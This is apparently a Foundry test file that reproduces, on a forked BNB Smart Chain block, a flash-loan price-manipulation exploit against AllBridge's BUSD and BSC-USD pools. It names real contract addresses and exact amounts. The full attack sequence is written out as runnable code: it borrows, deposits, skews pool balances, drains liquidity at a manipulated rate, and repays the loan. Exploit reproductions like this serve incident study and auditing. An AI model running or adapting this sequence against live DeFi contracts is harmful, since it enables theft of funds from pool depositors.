// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./utils/interface.sol";

interface IBridgePool {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amountLp) external;

    function router() external view returns (address);

    function token() external view returns (address);
}

interface ISwapPool {
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external returns (uint256 actualToAmount, uint256 haircut);
}

interface IAllBridge {
    function swap(
        uint256 amount,
        bytes32 token,
        bytes32 receiveToken,
        address recipient
    ) external;

    function pools(bytes32 token) external view returns (address);
}

contract ContractTest is Test {
    IPancakePair constant BUSD_BSC_USD =
        IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    ISwapPool constant SwapPool =
        ISwapPool(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);
    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 constant BSC_USD =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    IAllBridge constant Bridge =
        IAllBridge(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);
    bytes32 constant bytes32BUSDAddr = bytes32(uint256(uint160(address(BUSD))));
    bytes32 constant bytes32BSCUSDAddr =
        bytes32(uint256(uint160(address(BSC_USD))));
    IBridgePool BUSDPool;
    IBridgePool BSC_USDPool;

    function setUp() public {
        vm.createSelectFork("bsc", 26982067);

        // Finding the desired pools. Bridge pools searched by bytes32(tokenAddress)
        BUSDPool = IBridgePool(Bridge.pools(bytes32BUSDAddr));
        BSC_USDPool = IBridgePool(Bridge.pools(bytes32BSCUSDAddr));

        emit log_named_address("Bridge BUSD Pool address", address(BUSDPool));
        emit log_named_address(
            "Bridge BSC-USD Pool address",
            address(BSC_USDPool)
        );

        vm.label(address(BUSD_BSC_USD), "BUSD_BSC_USD");
        vm.label(address(SwapPool), "SwapPool");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(BSC_USD), "BSC_USD");
        vm.label(address(BUSDPool), "BUSDPool");
        vm.label(address(BSC_USDPool), "BSC_USDPool");
    }

    function testPriceManipulation() public {
        emit log_named_decimal_uint(
            "Attacker BUSD balance before exploiting price manipulation",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );

        // Taking flash loan from BUSD/BSC-USD pair
        BUSD_BSC_USD.swap(0, 7_500_000 * 1e18, address(this), hex"00");

        emit log_named_decimal_uint(
            "Attacker BUSD balance after exploiting price manipulation",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );
    }

    function pancakeCall(
        address _sender,
        uint256 flashAmount0,
        uint256 flashAmount1,
        bytes calldata _data
    ) external {
        emit log_named_decimal_uint(
            "Flashloaned BUSD amount",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );

        BUSD.approve(address(SwapPool), type(uint256).max);
        BUSD.approve(address(BUSDPool), type(uint256).max);
        BSC_USD.approve(address(SwapPool), type(uint256).max);
        BSC_USD.approve(address(BSC_USDPool), type(uint256).max);

        // Preparation
        SwapPool.swap(
            address(BUSD),
            address(BSC_USD),
            2_003_300 * 1e18,
            1,
            address(this),
            block.timestamp
        );

        BUSDPool.deposit(5_000_000 * 1e18);

        SwapPool.swap(
            address(BUSD),
            address(BSC_USD),
            496_700 * 1e18,
            1,
            address(this),
            block.timestamp
        );

        BSC_USDPool.deposit(2_000_000 * 1e18);

        // Swap BSC_USD for BUSD. Creating high dividend for the previous deposit.
        Bridge.swap(
            BSC_USD.balanceOf(address(this)),
            bytes32BSCUSDAddr,
            bytes32BUSDAddr,
            address(this)
        );

        emit log_named_decimal_uint(
            "Balance of BUSD bridge pool before removing the liquidity",
            BUSD.balanceOf(address(BUSDPool)),
            BUSD.decimals()
        );

        BUSDPool.withdraw(4_830_262_616);

        emit log_named_decimal_uint(
            "Balance of BUSD bridge pool after removing the liquidity. Liquidity is broken at this moment",
            BUSD.balanceOf(address(BUSDPool)),
            BUSD.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker balance of BSC_USD before swap from Bridge.",
            BSC_USD.balanceOf(address(this)),
            BSC_USD.decimals()
        );

        Bridge.swap(
            40_000 * 1e18,
            bytes32BUSDAddr,
            bytes32BSCUSDAddr,
            address(this)
        );

        emit log_named_decimal_uint(
            "After swap. Only used 40000 BUSD for the following BSC_USD amount",
            BSC_USD.balanceOf(address(this)),
            BSC_USD.decimals()
        );

        BSC_USDPool.withdraw(1_993_728_530);

        SwapPool.swap(
            address(BSC_USD),
            address(BUSD),
            BSC_USD.balanceOf(address(this)),
            1,
            address(this),
            block.timestamp
        );

        // Repaying the flashloan after conducting successful attack
        uint256 feeAmount = (flashAmount1 * 3) / 997 + 1;
        BUSD.transfer(address(BUSD_BSC_USD), flashAmount1 + feeAmount);
    }
}
